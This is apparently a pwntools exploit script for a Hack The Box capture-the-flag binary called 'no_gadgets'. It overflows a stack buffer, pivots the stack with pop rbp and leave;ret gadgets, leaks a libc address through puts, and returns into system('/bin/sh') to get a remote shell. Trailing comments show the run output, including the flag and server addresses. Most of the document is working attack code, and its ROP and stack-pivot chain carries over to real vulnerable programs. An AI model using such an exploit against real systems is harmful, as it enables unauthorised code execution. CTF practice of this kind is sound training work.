#!/usr/bin/env python3
import pwn

exe = pwn.ELF("./no_gadgetse")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-2.35.so")
# pwn.context.log_level='debug'
pwn.context.terminal = ["foot"]

if pwn.args.REMOTE:
    p = pwn.remote("83.136.248.18",51273)
else:
    p = pwn.gdb.debug([exe.path],"""
    # b*0x000000000040122e
    #return 
    b*main+158

                    """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

add_rsp = 0x0000000000401012
pop_rbp = 0x000000000040115d
ret = 0x0000000000401016
leave_ret =0x0000000000401274
sub_add= 0x0000000000401278
leak = 0x404000
printf = 0x404010
puts= 0x401030
nop = 0x00000000004010ef
setbuf = 0x404020
fgets = 0x404018
strlen = 0x404008
got_puts = 0x404000
printf_plt = 0x401050
back_main = 0x00000000004011df
back_main2 = 0x000000000040121b
back_got = 0x404410
if __name__ == "__main__":
    # p = conn()
    payload = b"\0" + b"a"*(135-8) 
    # payload = b"a"*129
    payload += pwn.p64(strlen+0x50+0x30+0x88)
    payload += pwn.p64(back_main)
    # payload += pwn.p64(4214296)*100

    # payload += pwn.p64(pop_rbp)
    # payload += pwn.p64(0x000000000040115d)
    # payload += pwn.p64(0x0000000000401016)
    # payload += pwn.p64(exe.sym['main']+4)
    # payload += pwn.p64(0x0000000000401012)

    sla(b"Data:",payload)
    # payload = pwn.p64(0x404298)
    # payload += pwn.p64(back_main)
    payload = pwn.p64(pop_rbp)
    payload += pwn.p64(0x404460-0x8) 
    payload += pwn.p64(leave_ret)
    payload += pwn.p64(pop_rbp)
    payload += pwn.p64(0x404228) #x
    payload += pwn.p64(back_main2)
    payload = payload.ljust(136,b"a")
    payload += pwn.p64(pop_rbp)
    payload += pwn.p64(0x404440)
    payload += pwn.p64(leave_ret)
    payload += pwn.p64(exe.plt.puts)
    payload += pwn.p64(pop_rbp)
    payload += pwn.p64(0x404428)
    payload += pwn.p64(pop_rbp)
    payload += pwn.p64(0x404428)
    payload += pwn.p64(back_main2)
    payload += b"".ljust(232,b"a")
    payload += pwn.p64(pop_rbp)+pwn.p64(0x404428)+pwn.p64(back_main2)
    payload += b"".ljust(0x1e8,b"a")
    payload += pwn.p64(pop_rbp)
    payload += pwn.p64(strlen+0x50+0x30)
    payload += pwn.p64(back_main2)
    payload += pwn.p64(pop_rbp)
    payload += pwn.p64(0x404f68)
    payload += pwn.p64(back_main2)
    # leak state
    payload += b"".ljust(80,b"a")
    payload += pwn.p64(exe.plt.puts)
    payload += pwn.p64(pop_rbp)
    payload += pwn.p64(0x3ffb28)
    payload += pwn.p64(back_main2)
    sla(b"Data:",payload)
    payload = pwn.p64(leave_ret)
    input()
    sl(payload)
    input()
    payload = b""
    payload += pwn.p64(pop_rbp)
    payload += pwn.p64(0x404440+0x50+0x30)
    payload += pwn.p64(exe.sym['main']+92)
    payload = payload.ljust(136,b"a")
    payload += pwn.p64(pop_rbp)
    payload += pwn.p64(0x404ee0)
    payload += pwn.p64(leave_ret)
    sl(payload)
    # recv libc
    p.recvuntil(b"scratch!\n")
    leak_libc = pwn.u64(p.recv(6).ljust(8,b"\x00"))
    pwn.log.info(f"leak libc: {hex(leak_libc)}")
    libc_base = leak_libc - 0x8b850
    bin_sh = libc_base + libc.search(b"/bin/sh\x00").__next__()
    system_libc = libc_base + libc.sym['system']
    pop_rdi = libc_base + 0x000000000002a3e5
    pwn.log.info(f"libc base: {hex(libc_base)}")
    pwn.log.info(f"bin_sh: {hex(bin_sh)}")
    pwn.log.info(f"system_libc: {hex(system_libc)}")
    pwn.log.info(f"pop_rdi: {hex(pop_rdi)}")
    payload = b""
    payload = payload.ljust(136,b"a")
    payload += pwn.p64(pop_rdi)
    payload += pwn.p64(bin_sh)
    payload += pwn.p64(system_libc)
    input()
    sl(payload)
# [*] leak libc: 0x7ff0ceb20850
# [*] libc base: 0x7ff0cea95000
# [*] bin_sh: 0x7ff0cec6d698
# [*] system_libc: 0x7ff0ceae5d60
# [*] pop_rdi: 0x7ff0ceabf3e5
#
# [*] Switching to interactive mode
#
# $ ls
# flag.txt
# ld-2.35.so
# libc.so.6
# no_gadgets
# $ cat flag.txt
# HTB{wh0_n3eD5_rD1_wH3n_Y0u_h@v3_rBp!!!_92e0eb70ee6d530b2e6a4a8a230dc258}$ 
# [*] Interrupted
# [*] Closed connection to 94.237.61.244 port 39654



    # good luck pwning :)
    p.interactive()
